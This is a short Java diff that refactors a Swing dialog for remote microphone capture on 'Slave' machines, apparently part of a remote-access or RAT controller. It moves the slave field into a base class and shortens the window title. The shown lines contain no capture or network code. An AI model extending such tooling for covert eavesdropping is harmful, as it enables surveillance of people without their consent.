@@ -31,7 +31,6 @@ public class DialogRemoteSoundCapture extends BaseDialog {
 	public static Map<Slave, DialogRemoteSoundCapture> INSTANCES = new HashMap<Slave, DialogRemoteSoundCapture>();
 
 	private JPanel contentPane;
-	private Slave slave;
 	private JButton btnStartListen;
 	private JButton btnStopListen;
 
@@ -40,6 +39,7 @@ public class DialogRemoteSoundCapture extends BaseDialog {
 	private JButton btnStartRecording;
 
 	public DialogRemoteSoundCapture(Slave sl) {
+		super(sl);
 		addWindowListener(new WindowAdapter() {
 			@Override
 			public void windowClosing(WindowEvent arg0) {
@@ -48,9 +48,8 @@ public class DialogRemoteSoundCapture extends BaseDialog {
 		});
 		setResizable(false);
 		setIconImage(Toolkit.getDefaultToolkit().getImage(DialogRemoteSoundCapture.class.getResource("/icons/microphone.png")));
-		this.slave = sl;
 		INSTANCES.put(slave, this);
-		setTitle("Sound capture - " + sl.getIP() + " - " + sl.getComputerName());
+		setTitle("Microphone");
 		setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
 		setBounds(100, 100, 332, 114);
 		contentPane = new JPanel();
